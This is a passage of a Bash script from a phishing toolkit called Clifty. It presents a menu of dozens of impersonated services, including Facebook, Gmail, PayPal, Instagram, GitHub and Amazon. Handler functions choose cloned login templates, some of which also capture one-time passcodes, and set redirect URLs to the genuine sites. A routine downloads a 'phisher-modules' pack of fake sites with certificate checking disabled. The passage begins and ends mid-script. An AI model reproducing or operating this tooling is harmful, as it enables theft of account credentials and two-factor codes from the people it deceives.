echo -e "${BLUE} [17]${GREEN} Gitlab 	   ${NC}""${BLUE} [42]${GREEN} Reddit       ${NC}""${BLUE} [67]${GREEN} Mobile Pattern${NC}"
echo -e "${BLUE} [18]${GREEN} Gmail	   ${NC}""${BLUE} [43]${GREEN} Shopify      ${NC}"
echo -e "${BLUE} [19]${GREEN} Google 	   ${NC}""${BLUE} [44]${GREEN} Snapchat     ${NC}"
echo -e "${BLUE} [20]${GREEN} Gpay 	   ${NC}""${BLUE} [45]${GREEN} Socialclub   ${NC}"
echo -e "${BLUE} [21]${GREEN} icloud 	   ${NC}""${BLUE} [46]${GREEN} Spotify      ${NC}"
echo -e "${BLUE} [22]${GREEN} Instagram    ${NC}""${BLUE} [47]${GREEN} Stackoverflow${NC}"
echo -e "${BLUE} [23]${GREEN} Jazz	   ${NC}""${BLUE} [48]${GREEN} Steam        ${NC}"
echo -e "${BLUE} [24]${GREEN} Jio 	   ${NC}""${BLUE} [49]${GREEN} Subitout     ${NC}"
echo -e "${BLUE} [25]${GREEN} Linkedin     ${NC}""${BLUE} [50]${GREEN} Telegram     ${NC}"
checksite_menu
echo -e "${BLUE} [A]${MAGENTA} About         ${NC}""${BLUE} [B]${MAGENTA} Request site  ${NC}""${BLUE} [C]${MAGENTA} Report Issue${NC}"
echo -e "${BLUE} [D]${MAGENTA} Logs          ${NC}""${BLUE} [E]${MAGENTA} Check Updates ${NC}""${BLUE} [0]${MAGENTA} Exit        ${NC}"
echo -e " "
uprompt;read -p "${prompt}" reply
echo -e " "
case $reply in
        1 | 01)
                site_adobe;;
        2 | 02)
                site_airtelsim;;
	3 | 03)
                site_airtelxstream;;
	4 | 04)
		site_ajio;;
	5 | 05)
                site_amazon;;
        6 | 06)
                site_apple;;
	7 | 07)
                site_badoo;;
        8 | 08)
                site_clashofclans;;
	9 | 09)
                site_date;;
        10)
                site_devianart;;
	11)
                site_dropbox;;
	12)
                site_ebay;;
        13)
                site_facebook;;
	14)
                site_flipcart;;
	15)
                site_freefire;;
        16)
                site_github;;
	17)
                site_gitlab;;
	18)
                site_gmail;;
        19)
                site_google;;
	20)
		site_gpay;;
	21)
                site_icloud;;
	22)
                site_instagram;;
	23)
                site_jazz;;
        24)
                site_jio;;
        25)
                site_linkedin;;
        26)
                site_mediafire;;
	27)
                site_messenger;;
	28)
                site_microsoft;;
	29)
                site_mobiwik;;
	30)
                site_myspace;;
	31)
                site_netflix;;
	32)
                site_ola;;
	33)
                site_origin;;
	34)
                site_paypal;;
	35)
                site_paytm;;
	36)
                site_phonepe;;
	37)
                site_pinterest;;
	38)
		site_playstation;;
	39)
                site_protonmail;;
	40)
                site_pubg;;
	41)
                site_quora;;
	42)
                site_reddit;;
	43)
                site_shopify;;
	44)
                site_snapchat;;
	45)
                site_socialclub;;
	46)
                site_spotify;;
	47)
                site_stackoverflow;;
	48)
                site_steam;;
	49)
                site_subitoit;;
	50)
                site_telegram;;
	51)
                site_telenor;;
	52)
                site_tiktok;;
        53)
                site_twitch;;
	54)
                site_twitter;;
        55)
                site_ubereats;;
	56)
                site_verizon;;
        57)
                site_visim;;
	58)
                site_vk;;
        59)
                site_whatsapp;;
	60)
                site_wordpress;;
        61)
                site_xbox;;
	62)
                site_yahoo;;
        63)
                site_yandex;;
	64)
                site_ytsubs;;
	65)
		site_discord;;
	66)
		site_googlewifi;;
	67)
		site_pattern;;
	A | a)
		xdg-open https://github.com/Alygnt/Clifty
		{ sleep 2; clear;  banner; mainmenu; };;
	B | b | C | c)
		xdg-open https://github.com/RDXLR/Alygnt/issues/new
		{ sleep 2; clear; banner; mainmenu; };;
	D | d)
		logs_check;;
	E | e)
		check_net_update;;
	0 | 00)
		msg_exit;;
        x | X)
                download_allsite;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; mainmenu; };;
esac
}

#Check site for menu
checksite_menu(){
if [[ ! -d "${sites_dir}" ]]; then
        echo -e " "
        echo -e "               ${BLUE} [X] ${LBLUE}Download all sites            ${NC}"
        echo -e " "
else
        echo -e " "
fi
}

## DOWNLOAD SITES
download_allsite(){
        { clear; banner; echo -e ""; }
        check_netstats
	if [ $plainnetstats == "online" ]; then
		rm -rf ${sites_dir}
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
                wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
                sleep 1
                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
                unzip -q sites.zip
                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
                mv phisher-modules-sites "${pro_dir}/.sites"
                rm sites.zip
		if [ -d "${pro_dir}/.sites" ]; then
	                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DOWNLOADED SUCCESSFULLY... ${NA}"
	                sleep 3
	                mainmenu
		else
			echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} UNABLE TO DOWNLOAD THE SITES, Try again later... ${NA}"
                        sleep 5
                        mainmenu
		fi
	else
		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} YOUR OFFLINE!! CAN'T DOWNLOAD NOW ${NA}"
		sleep 3
		mainmenu
	fi
}
#WEBSITES
#adobe
site_adobe(){
siname="Adobe"
dgfname="adobe"
rdurl="www.adobe.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
	1 | 01)
		website="adobe"
                sitype="Default"
		tunnelmenu;;
	2 | 02)
                website="adobe/otp"
                sitype="OTP"
                tunnelmenu;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_adobe; };;
esac
}
#airtelsim
site_airtelsim(){
website="airtelsim"
rdurl="www.airtel.in"
siname="Airtel Sim"
website="airtelsim"
sitype="Default"
tunnelmenu
}
#airtelxstream
site_airtelxstream(){
siname="AirtelXStream"
dgfname="airtelxstream"
rdurl="www.airtelxstream.in"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="airtelxstream"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="airtelxstream/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_airtelxstream; };;
esac
}
#ajio
site_ajio(){
siname="AJIO"
dgfname="ajio"
rdurl="www.ajio.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="ajio"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="ajio/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_ajio; };;
esac
}
#amazon
site_amazon(){
siname="Amazon"
dgfname="amazon"
rdurl="www.amazon.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="amazon"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="amazon/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_amazon; };;
esac
}
#apple
site_apple(){
siname="Apple"
dgfname="apple"
rdurl="www.apple.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="apple"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="apple/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_apple; };;
esac
}
#badoo
site_badoo(){
siname="Badoo"
dgfname="badoo"
rdurl="badoo.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="badoo"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="badoo/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_badoo; };;
esac
}
#clashofclans
site_clashofclans(){
website="clashofclans"
rdurl="clashofclans.com/"
siname="Clash Of Clans"
dgfname="clashofclans"
sitype="Default"
tunnelmenu
}
#date
site_date(){
siname="Date (Multiple phish)"
rdurl="date.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="date1"
                dgfname="date1"
                sitype="1"
                tunnelmenu;;
        2 | 02)
                website="date1/otp"
                dgfname="date1"
                sitype="1/OTP"
                tunnelmenu;;
	3 | 03)
                website="date2"
                dgfname="date2"
                sitype="2"
                tunnelmenu;;
        4 | 04)
                website="date2/otp"
                dgfname="date2"
                sitype="2/OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_date; };;
esac
}
#devianart
site_devianart(){
siname="Devian Art"
dgfname="devianart"
rdurl="www.deviantart.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="devianart"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="devianart/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_airtelxstream; };;
esac
}
#dropbox
site_dropbox(){
website="dropbox"
rdurl="www.dropbox.com/"
siname="Drop Box"
dgfname="dropbox"
tunnelmenu
}
#ebay
site_ebay(){
siname="Ebay"
dgfname="ebay"
rdurl="www.ebay.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="ebay"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="ebay/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_ebay; };;
esac
}
#facebook
site_facebook(){
siname="Facebook"
rdurl="www.facebook.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Facebook Poll - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="facebook"
                sitype="Default"
                dgfname="facebook"
                tunnelmenu;;
        2 | 02)
                website="facebook/otp"
                sitype="OTP"
                dgfname="facebook"
                tunnelmenu;;
	3 | 03)
                website="fb_poll"
                rdurl="result.html"
                sitype="Poll"
                dgfname="fb_poll"
                tunnelmenu;;
        4 | 04)
                website="fb_poll/otp"
                rdurl="result.html"
                sitype="Poll/OTP"
                dgfname="fb_poll"
                tunnelmenu;;
	5 | 05)
                website="fb_security"
                sitype="Security"
                dgfname="fb_security"
                tunnelmenu;;
        6 | 06)
                website="fb_security/otp"
                sitype="Security/OTP"
                dgfname="fb_security"
                tunnelmenu;;
	7 | 07)
                website="fb_standard"
                sitype="Standard"
                dgfname="fb_standard"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_facebook; };;
esac
}
#flipcart
site_flipcart(){
siname="Flipcart"
dgfname="flipcart"
rdurl="www.flipcart.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="flipcart"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="flipcart/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_flipcart; };;
esac
}
#freefire
site_freefire(){
website="freefire"
dgfname="freefire"
rdurl="ff.garena.com"
siname="Free Fire"
tunnelmenu
}
#github
site_github(){
siname="GitHub"
rdurl="www.github.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="github"
                sitype="Default"
                dgfname="github"
                tunnelmenu;;
        2 | 02)
                website="github/otp"
                sitype="OTP"
                dgfname="github"
                tunnelmenu;;
	3 | 03)
                website="github_advanced"
                sitype="Advanced"
                dgfname="github_advanced"
                tunnelmenu;;
        4 | 04)
                website="github_advanced/otp"
                sitype="Advanced/OTP"
                dgfname="github_advanced"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_github; };;
esac
}
#gitlab
site_gitlab(){
siname="GitLab"
rdurl="www.gitlab.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
	1 | 01)
                website="gitlab"
                sitype="Default"
                dgfname="gitlab"
                tunnelmenu;;
        2 | 02)
                website="gitlab/otp"
                sitype="OTP"
                dgfname="gitlab"
                tunnelmenu;;
        3 | 03)
                website="gitlab_advanced"
                sitype="Advanced"
                dgfname="gitlab_advanced"
                tunnelmenu;;
        4 | 04)
                website="gitlab_advanced/otp"
                sitype="OTP"
                dgfname="gitlab_advanced"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_gitlab; };;
esac
}
#gmail
site_gmail(){
siname="Gmail"
dgfname="gmail"
rdurl="www.gmail.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="gmail"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="gmail/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_gmail; };;
esac
}
#google
site_google(){
siname="Google"
rdurl="www.gmail.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="google"
                sitype="Default"
                dgfname="google"
                tunnelmenu;;
        2 | 02)
                website="google/otp"
                sitype="OTP"
                dgfname="google"
                tunnelmenu;;
        3 | 03)
                website="google_poll"
                rdurl="result.html"
                sitype="Poll"
                dgfname="google_poll"
                tunnelmenu;;
        4 | 04)
                website="google_poll/otp"
                rdurl="result.html"
                sitype="Poll/OTP"
                dgfname="google_poll"
                tunnelmenu;;
        5 | 05)
                website="google_old"
                sitype="Old"
                dgfname="google_old"
                tunnelmenu;;
	6 | 06)
		website="google_old/otp"
                sitype="Old/OTP"
                dgfname="google_old"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_google; };;
esac
}
#gpay
site_gpay(){
siname="Gpay"
dgfname="gpay"
rdurl="pay.google.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="gpay"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="gpay/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_gpay; };;
esac
}
#icloud
site_icloud(){
website="icloud"
rdurl="www.icloud.com/"
siname="iCloud"
dgfname="icloud"
tunnelmenu
}
#instagram
site_instagram(){
siname="Instagram"
rdurl="www.instagram.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Instagram Advanced - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Instagram Autoliker - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Instagram Autoliker- WITH OTP ${NC}"
echo -e "${BLUE}[07]${CYAN} Instagram Followers - WITHOUT OTP ${NC}"
echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="instagram"
                sitype="Default"
                dgfname="instagram"
                tunnelmenu;;
        2 | 02)
                website="instagram/otp"
                sitype="OTP"
                dgfname="instagram"
                tunnelmenu;;
        3 | 03)
                website="ig_advanced"
                sitype="Advanced"
                dgfname="ig_advanced"
                tunnelmenu;;
        4 | 04)
                website="ig_advanced/otp"
                sitype="Advanced/OTP"
                dgfname="ig_advanced"
                tunnelmenu;;
        5 | 05)
                website="ig_autoliker"
                sitype="Autoliker"
                dgfname="ig_autoliker"
                tunnelmenu;;
        6 | 06)
                website="ig_autoliker/otp"
                sitype="Autoliker/OTP"
                dgfname="ig_autoliker"
                tunnelmenu;;
        7 | 07)
                website="ig_followers"
                sitype="Followers"
                dgfname="ig_followers"
                tunnelmenu;;
	8 | 08)
                website="ig_followers/otp"
                sitype="Followers/OTP"
                dgfname="ig_followers"
                tunnelmenu;;
	9 | 09)
                website="ig_verify"
                rdurl="login3.html"
                sitype="Verify"
                dgfname="ig_verify"
                tunnelmenu;;
	10)
                website="ig_old"
                sitype="Old"
                dgfname="ig_old"
                tunnelmenu;;
        11)
                website="ig_old/otp"
                sitype="Old/OTP"
                dgfname="ig_old"
                tunnelmenu;;
	12)
	        website="ig_video"
                sitype="Video"
                dgfname="ig_video"
	        tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_instagram; };;
esac
}
#jazz
site_jazz(){
website="jazz"
rdurl="jazz.com.pk/"
siname="Jazz"
dgfname="jazz"
sitype="Default"
tunnelmenu
}
#jio
site_jio(){
siname="JIO"
rdurl="www.jio.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
